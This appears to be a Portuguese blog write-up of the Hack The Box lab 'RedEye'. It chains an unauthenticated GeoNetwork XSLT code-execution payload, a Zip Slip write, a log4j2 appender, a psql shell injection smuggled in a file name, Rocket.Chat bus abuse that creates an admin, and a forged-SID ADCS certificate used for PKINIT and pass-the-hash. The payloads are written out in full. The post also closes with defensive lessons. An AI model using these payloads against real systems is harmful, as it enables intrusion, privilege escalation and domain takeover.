---
title: "HTB RedEye: RCE anônimo no GeoNetwork, bus do Rocket.Chat e um SID forjado no TameMyCerts"
summary: "Três máquinas atrás de um único front. O GeoNetwork entrega execução sem credencial, o spool do raster2pgsql entrega a conta gisops, e o diretório de política do TameMyCerts no ADCS deixa qualquer Domain User emitir um certificado com o SID do Administrator."
date: 2026-11-16
lang: pt-br
target: "HTB RedEye (10.129.28.102 → 10.129.28.183)"
tags: ["adcs", "pkinit", "geonetwork", "rce", "active-directory", "sql-injection"]
pair: htb-redeye-en
draft: false
---

## Reconhecimento

O front é `10.129.28.102`, mas ele não é o alvo: é a NIC externa do DC01 com DNAT para a rede interna. Durante a sessão a caixa foi redeployada para `10.129.28.183`; o layout não mudou, só o endereço.

```bash
nmap -Pn -sT -p- --min-rate 500 -T4 --open 10.129.28.102
```

| Porta | Serviço | Nota |
| --- | --- | --- |
| 22 | SSH | GN01, o host Ubuntu |
| 80 | HTTP | `geo.airways.htb`, GeoNetwork 4.4.11 |
| 443 | HTTPS | `sts.airways.htb`, ADFS no DC01 |
| 3000 | HTTP | `chat.airways.htb`, Rocket.Chat 8.8.0 |

Atrás disso, três hosts em `192.168.100.0/24`: **DC01** (`.1`, Windows Server 2022, Domain Controller), **GN01** (`.2`, Ubuntu com GeoNetwork e Rocket.Chat) e **WKSTN01** (`.3`, estação Windows). O front não expõe 445, 636 nem 135. O 443 termina no ADFS do DC01, mas sem credencial é só uma tela de login. O caminho que dava execução era o GN01, e é lá que o primeiro RCE cai.

## O formatter do GeoNetwork executa código sem autenticação

O primeiro endpoint que respondeu sem sessão foi o upload de formatters:

```http
POST /geonetwork/srv/api/formatters HTTP/1.1
Host: geo.airways.htb
Cookie: XSRF-TOKEN=<token anônimo>
X-XSRF-TOKEN: <token anônimo>
Content-Type: multipart/form-data

file=@i387x137.zip;type=application/zip
```

O único controle é o cookie XSRF anônimo. O bundle aceito carrega um `view.xsl` que o Saxon avalia com extensões Java habilitadas. O `Runtime.exec` do `java.lang` está a uma linha de distância:

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:result-document href="file:///tmp/xcmd.sh" method="text">
      { id; uname -a; ps -ef; } > /var/lib/geonetwork/data/resources/htmlcache/i387.txt 2>&1
    </xsl:result-document>
    <xsl:value-of select="rt:exec(rt:getRuntime(),'/bin/sh /tmp/xcmd.sh')"/>
  </xsl:template>
</xsl:stylesheet>
```

O `result-document` escreve o script, o `rt:exec` chama o shell, e o `GET` no record do formatter dispara o render. A saída volta em `/geonetwork/htmlcache/<nome>.txt`:

```text
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
GN01
```

É o RCE não autenticado do finding 10. A partir daqui todo comando é uma requisição, e o GN01 alcança `192.168.100.1` e `192.168.100.3`.

## Zip Slip, log4j2 e um canal que não cai

O render de formatter funciona, mas depende do engine XSLT e de um record id válido. Para transformar isso num canal estável, voltei ao mesmo upload com outra intenção: escrita arbitrária.

A extração do bundle usa o separador backslash sem normalizar o caminho. Uma entrada com oito `..\` sobe de `/var/lib/geonetwork/data/formatter/<fmt>` até a raiz e escreve onde eu quiser. O alvo útil é o webapp explodido:

```text
..\..\..\..\..\..\..\..\opt\geonetwork\apps\geonetwork\WEB-INF\classes\i217.sh
```

O upload devolve 500, mas grava o arquivo antes de reclamar, e o erro entrega o caminho resolvido:

```json
{"message":"/var/lib/geonetwork/data/formatter/k1/../../../../../../../../opt/geonetwork/apps/geonetwork/i123_marker.txt","code":"runtime_exception"}
```

Com escrita em `WEB-INF/classes`, o passo seguinte é o classpath. Plantei um XML de log4j2 cujo `packages="org.fao.geonet.api"` registra um appender próprio, e uma classe `@Plugin` compilada no mesmo pacote. O setting `system/server/log` aceita o nome do recurso, e o SSO do ADFS já nos dava sessão no GeoNetwork:

```http
POST /geonetwork/srv/api/site/settings HTTP/1.1
Host: geo.airways.htb
Content-Type: application/x-www-form-urlencoded

system/server/log=log4j2-evil.xml
```

O `LogUtils.refreshLogConfiguration` carrega o recurso do classpath e aplica ao `LoggerContext`. O appender executa o comando que está em `cmd.txt` como uid 999. O que era um RCE dependente de um render virou um canal repetível, com o mesmo usuário e sem tocar no serviço.

O inventário fica assim: 10 é o RCE inicial, 106 é o Zip Slip, 127 e 135 são a execução via log4j2. A distinção importa porque o primitivo de escrita é o que sobrevive quando o render quebra.

## De geonetwork a gisops

O GN01 tem stack de GIS: PostGIS, um spool em `/srv/gis/spool/incoming` e o `aodb-ingest.service`, disparado por `aodb-ingest.path`. O serviço roda como `gisops` e monta o comando assim:

```bash
layer=$(basename "${src%.*}")
raster2pgsql -s 4326 -d -I -C -F -t 256x256 "$src" "gis.${layer}" \
  | psql -q -d geonetwork_db -U gis_etl
```

O nome da tabela vem do nome do arquivo, sem quoting. O `psql` não é só um consumidor de SQL: ele interpreta meta-comandos. Um `\!` no stream executa um comando de shell no processo cliente, que é o `gisops` — não o `gis_etl` do banco.

O arquivo não precisa ser um TIFF válido. Basta o nome:

```text
z";\! s=$(pwd | cut -c1); sh ${s}srv${s}gis${s}spool${s}incoming${s}g.sh;-- .tif
```

O `g.sh` roda como `gisops` (uid 997). O próximo alvo estava no diretório ao lado: `/etc/airport-gis/notify.env`, `root:gisops` e modo 0640, legível, portanto, pelo `gisops`.

```text
RC_USER=...
RC_PASS=<redacted>
```

A senha do Rocket.Chat era a senha de domínio de `gabby.t`. O bind LDAPS em 636 voltou `rc=0`, e o domínio tinha `lockoutThreshold=0` — sem bloqueio para quem quisesse testar. Finding 22 entrega o shell, finding 37 entrega a conta.

## Rocket.Chat: o bus local não é uma fronteira

Com código no GN01, o `127.0.0.1:36657` deixa de ser local. É o transporter TCP do Moleculer que o Rocket.Chat usa para o bus interno, e ele aceita pacotes sem autenticação. O framing é simples: seis bytes de header, XOR dos cinco primeiros no byte zero, tamanho big-endian e um type.

O evento que interessa é `broadcast` no stream `local`, com destino `watch.settings`. O handler do MeteorService faz `settings.set(record)` direto no cache em memória. Não é preciso ser admin para publicar no bus; é preciso ser admin para o resultado ser útil, e o resultado cria o admin:

```json
{"clientAction":"updated","setting":{"_id":"Accounts_RegistrationForm","value":"Public"}}
{"clientAction":"updated","setting":{"_id":"Accounts_ManuallyApproveNewUsers","value":false}}
{"clientAction":"updated","setting":{"_id":"Accounts_Registration_Users_Default_Roles","value":"admin"}}
```

Depois disso, `POST /api/v1/users.register` cria uma conta comum. A conta nasce com role `admin` porque o registro público passou a usar `admin` como default. O `GET /api/v1/users.list` confirma:

```json
{"username":"i153adm25199","roles":["admin"],"active":true}
```

O finding 171 é esse. O mesmo canal ainda aceita `watch.integrations` com `clientAction: inserted`, o que permite inserir um webhook de saída sem passar pela API. Não precisei ir além para a cadeia do domínio, mas o primitivo está lá.

## O domínio, o WKSTN01 e o user.txt

Com `gabby.t`, a enumeração do AD por LDAPS 636 foi direta: usuários, grupos, ACLs, zonas DNS, templates. Dois achados mudaram o mapa.

O primeiro foi a zona ADIDNS `airwayhtb`. `Authenticated Users` tem `CreateChild` no nó da zona, então `gabby.t` criou um registro wildcard `*` apontando para `192.168.100.2`. O DNS do DC01 passou a servir esse A para qualquer nome inexistente em cerca de 30 segundos. É coerção NTLM passiva: qualquer serviço do DC01 que resolva um nome que não existe autentica para o GN01. Registros de host existentes não são graváveis (`rc=50`) e update dinâmico não assinado é recusado (`rcode=9`). O relay para LDAPS e o RBCD chegaram a ser preparados, mas não fecharam a cadeia; ficou documentado como finding 212 e como negativo.

O segundo foi `isabel.o`. A conta é membro **direto** de `BUILTIN\Administrators` no WKSTN01 (RID 1638):

```text
S-1-5-21-4146114734-3004133792-201478249-500   WKSTN01\Administrator
S-1-5-21-829808936-2739584302-670142182-512    AIRWAYS\Domain Admins
S-1-5-21-829808936-2739584302-670142182-1638   AIRWAYS\isabel.o
```

Com a credencial de domínio de `isabel.o`, o SMB administrativo abriu `C$` e `ADMIN$`, e o `user.txt` estava no desktop do Administrator local. A verificação foi feita duas vezes, inclusive por SAMR, e o contraste com `gabby.t` é o teste que separa privilégio de coincidência:

```text
ISABEL USER_TXT_LEN: 34
GABBY C$: ERR 0xc0000022 STATUS_ACCESS_DENIED
```

No DC01, `isabel.o` ainda tinha RDP, `GP Management` e um diretório de política gravável. Isso não dava Domain Admin por si, mas era a peça que faltava para o passo seguinte.

O caminho para escrever no DC01 foi uma sessão RDP como `isabel.o` com um `cmd` em laço: ele buscava jobs no listener do GN01, executava e devolvia a saída. Foi esse beacon que criou o `User.xml`; o pedido do certificado saiu do GN01 por DCOM/TCP 135, com a mesma conta.

## ADCS: um SID forjado no diretório de política

O CA `AIRWAYS-DC01-CA` usa o módulo de política `TameMyCerts.Policy` com `PolicyDirectory = C:\PolicyFiles`. O esquema é `<TemplateName>.xml`, relido **a cada pedido**, sem restart do serviço.

A ACL é o problema: `BUILTIN\Users` tem `(CI)(AD)` e `(CI)(WD)`, ou seja, pode criar arquivos novos. Os existentes, como `GroupPolicy_Audit.xml`, são imutáveis — o que dá a falsa sensação de que o diretório está protegido. O template `User` é enrollable por Domain Users e tem EKU de client auth.

Criei `C:\PolicyFiles\User.xml` como `isabel.o`, com duas partes. A primeira limpa o SAN que o requerente já manda: as regras com `Value=""` e `Force=true` removem o UPN e o rfc822Name da isabel, e a regra seguinte injeta o UPN do Administrator. A segunda adiciona a extensão SID (`1.3.6.1.4.1.311.25.2`) com o DER do SID `-500`:

```xml
<CertificateRequestPolicy>
  <OutboundSubjectAlternativeName>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>rfc822Name</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value>Administrator@airways.htb</Value>
      <Mandatory>true</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
  </OutboundSubjectAlternativeName>
  <CustomCertificateExtensions>
    <CustomCertificateExtension>
      <Oid>1.3.6.1.4.1.311.25.2</Oid>
      <Value>MD2gOwYKKwYBBAGCNxkCAaAtBCtTLTEtNS0yMS04Mjk4MDg5MzYtMjczOTU4NDMwMi02NzAxNDIxODItNTAw</Value>
    </CustomCertificateExtension>
  </CustomCertificateExtensions>
</CertificateRequestPolicy>
```

O detalhe que queimou a primeira tentativa foi o SAN residual. Pedir o certificado com SAN `isabel` e SID `-500` devolveu `KDC_ERR_CLIENT_NAME_MISMATCH`: o KDC validou o nome do requerente, não o SID. Remover os SANs UPN e rfc822Name da isabel com as regras `Value=""` resolveu. O segundo pedido, REQID=30, template `User`, RSA-2048 via DCOM/TCP 135, voltou:

```text
DISP=0x3 REQID=30 MSG='Issued'
SAN=<OtherName(1.3.6.1.4.1.311.20.2.3, 'Administrator@airways.htb')>
SIDEXT=<DER de S-1-5-21-829808936-2739584302-670142182-500>
```

O certificado é da isabel, mas diz ser o Administrator. O PKINIT acredita no SID:

```bash
certipy auth -pfx adm.pfx -username Administrator -dc-ip 192.168.100.1
```

```text
Got TGT
Got hash for 'administrator@airways.htb': <redacted>
```

O resto é pass-the-hash. SMB no DC01 como `airways.htb/Administrator`, `C$`, e o `root.txt` no desktop. Domain Users → Domain Admin, sem reiniciar o CA e sem interação.

## O que fechou

A caixa é grande, e a maior parte do tempo foi gasta em rotas que não fecharam. Vale registrar para não repetir:

- **ESC1–ESC8** não estavam disponíveis; o template `OfflineRouter` tinha SAN suprível, mas sem direito de enrollment.
- **ESC13/GPO**: `GPO-Auditors` era honeypot, e a varredura de ACLs com o parser de SD correto não deu `WriteProperty` útil em GPO aplicado ao DC.
- **Relay LDAP 389** não existe; só LDAPS. A coerção RPC clássica não tinha Spooler, FSRVP, WebClient nem EFSRPC.
- **ADIDNS → LDAPS → RBCD** foi montado até o wildcard, mas nenhum serviço do DC01 resolveu o nome inexistente na janela.
- **SQL no DC01**: apenas WID, sem TCP 1433.
- **DCC2 do Administrator** foi esgotado no crack; `DPAPI`/Vault do WKSTN01 não entregaram nada utilizável.
- **Grupos built-in privilegiados** estavam vazios. **ADFS `/policy`** recusou as ações. **Root no GN01** e **hijack do XML de tarefas agendadas** não passaram.
- A caixa ainda caiu no meio da sessão e voltou com outro IP. O redeploy não mudou o estado do domínio.

## O que eu levaria para o próximo alvo

O diretório de política do CA é a materialização de uma ideia simples: se o módulo lê um arquivo cujo nome o atacante escolhe, e o diretório aceita arquivos novos, o atacante controla a política. Não é preciso escrever no serviço nem reiniciar nada. A correção é ACL restrita a Administrators/SYSTEM e uma política que não permita ao requerente impor SAN nem extensão SID.

O segundo detalhe é o KDC. Um certificado com SID `-500` não é um certificado de Administrator: é um certificado de outra pessoa que diz ser Administrator. O PKINIT não valida a identidade do requerente contra o SID quando a política do módulo o reescreve. Monitorar emissões com SID diferente do requerente, e PKINIT de contas privilegiadas fora do padrão, é o que sobra.

O terceiro é a fronteira. `127.0.0.1` não é autenticação depois que você tem código no host. O transporter do Moleculer, o cache de settings e o registro público formam uma cadeia de três passos que cria um admin do zero. O mesmo raciocínio vale para o `notify.env`: uma senha de serviço de chat era a senha de domínio de uma pessoa, e o domínio não tinha lockout.

Por último, o `raster2pgsql`: nome de arquivo não é identificador confiável. O `\!` do psql transforma uma injeção de nome de tabela em shell. Se o serviço roda como uma conta de serviço, o banco é o menor dos problemas.